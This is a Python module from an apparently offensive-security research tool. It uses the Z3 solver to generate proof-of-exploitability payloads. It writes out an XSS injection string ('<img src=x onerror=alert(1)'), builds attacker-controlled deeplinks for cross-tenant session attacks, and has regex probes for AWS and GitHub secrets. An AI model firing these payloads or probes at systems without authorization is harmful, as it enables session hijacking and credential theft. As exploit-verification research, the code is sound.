"""BUCKY payload_synth — Z3-powered concrete payload materialization.

Agent-J synthesis: the runtime proof-gate's solver leg.
- Kudzu S&P'10 role: string constraints over attacker-controlled
  inputs, solver produces a CONCRETE value (not a maybe).
- PMForce CCS'20 role: Exploit Templates — path constraints solved to
  an exploit message that proves exploitability.
- z3-solver 5.1.0 native string theory (pip-verified) replaces Kudzu's
  bespoke solver.

Deterministic fallback: when z3 is unavailable (or solve times out),
template instantiation from the profile's hint-shapes still emits a
CANDIDATE payload — but the proof-gate keeps treating it as
unproven (candidate-only), per the DOMsday 90%-static-miss rule.
"""
from __future__ import annotations

from dataclasses import dataclass

from core.proof_gate import z3_available


@dataclass(frozen=True)
class SynthPayload:
    capability: str
    payload: str
    proven: bool        # solver-materialized (True) vs template (False)
    method: str         # "z3-string-theory" | "template-fallback"
    detail: str = ""


# constraint spec: what a valid payload must satisfy per capability
# (kept generic; campaign profiles refine the constants)
def synth_xss_marker_payload(marker: str = "BUCKYMARK") -> SynthPayload:
    """Materialize an HTML-injection payload carrying a unique marker.

    Constraint shape (Kudzu-class, PMForce Concat-pattern): concrete
    vector prefix + symbolic tail; the solver only fills the tail —
    avoids z3 IndexOf nonlinearity (empirically 'unknown' on this
    combo), keeps the solve tractable.
    """
    PREFIX = "<img src=x onerror=alert(1)//"
    if z3_available():
        try:
            import z3
            s = z3.Solver()
            s.set("timeout", 4000)          # 4s budget
            tail = z3.String("tail")
            # payload = concrete prefix + symbolic tail
            # constraint: tail must NOT contain the attr-breaking
            # double-quote or '<' (keeps injection minimal)
            s.add(z3.Length(tail) >= 0)
            s.add(z3.IndexOf(tail, z3.StringVal('"')) < 0)
            s.add(z3.IndexOf(tail, z3.StringVal("<")) < 0)
            if s.check() == z3.sat:
                model = s.model()
                names = [d.name() for d in model.decls()]
                val = (model[tail].as_string()
                       if "tail" in names else '""')
                if val.startswith('"') and val.endswith('"'):
                    val = val[1:-1]
                return SynthPayload(
                    "dom-xss", f"{PREFIX}{val}{marker}",
                    True, "z3-string-theory",
                    f"model tail={val!r}; marker {marker} appended")
        except Exception:
            pass
    # deterministic fallback (candidate-only)
    return SynthPayload(
        "dom-xss", f"{PREFIX}{marker}>",
        False, "template-fallback",
        "z3 unavailable/unsat — candidate payload, proof-gate stays "
        "lead (DOMsday 90%-static-miss rule)")


def synth_deeplink_payload(scheme: str, bot_route: str,
                           launch_param: str, victim_ref: str,
                           blob: str = "1") -> SynthPayload:
    """Materialize a launch-param deeplink (cross-tenant class).

    Constraint shape: scheme://route?param=REF&blob-payload — REF must
    be attacker-controlled (any value accepted), payload must survive
    URL encoding.
    """
    if z3_available():
        try:
            import z3
            s = z3.Solver()
            s.set("timeout", 5000)
            ref = z3.String("ref")
            s.add(z3.Length(ref) >= 4)
            s.add(z3.PrefixOf("attacker-", ref))
            s.add(z3.IndexOf(ref, "/") < 0)
            if s.check() == z3.sat:
                model = s.model()
                names = [d.name() for d in model.decls()]
                val = model[ref].as_string() if "ref" in names else ""
                if val.startswith('"') and val.endswith('"'):
                    val = val[1:-1]
                if val:
                    return SynthPayload(
                        "cross-tenant-session",
                        f"{scheme}://{bot_route}?{launch_param}={val}"
                        f"&data={blob}",
                        True, "z3-string-theory",
                        f"attacker-ref model: {val}")
        except Exception:
            pass
    return SynthPayload(
        "cross-tenant-session",
        f"{scheme}://{bot_route}?{launch_param}=attacker-x1&data={blob}",
        False, "template-fallback",
        "z3 unavailable/unsat — candidate deeplink, proof-gate stays "
        "lead")


def synth_session_leak_probe(secret_prefixes: tuple[str, ...] = (
        "AKIA", "ghp_")) -> SynthPayload:
    """Materialize a bundle-secret extraction probe (regex oracle)."""
    # deterministic by construction — solver adds nothing here
    pats = "|".join(f"({p}[A-Za-z0-9_+=/-]{{8,}})" for p in secret_prefixes)
    return SynthPayload(
        "secret-material-exposed", pats, True,
        "regex-oracle", "AKIA/ghp_ regex oracle (registry-driven)")
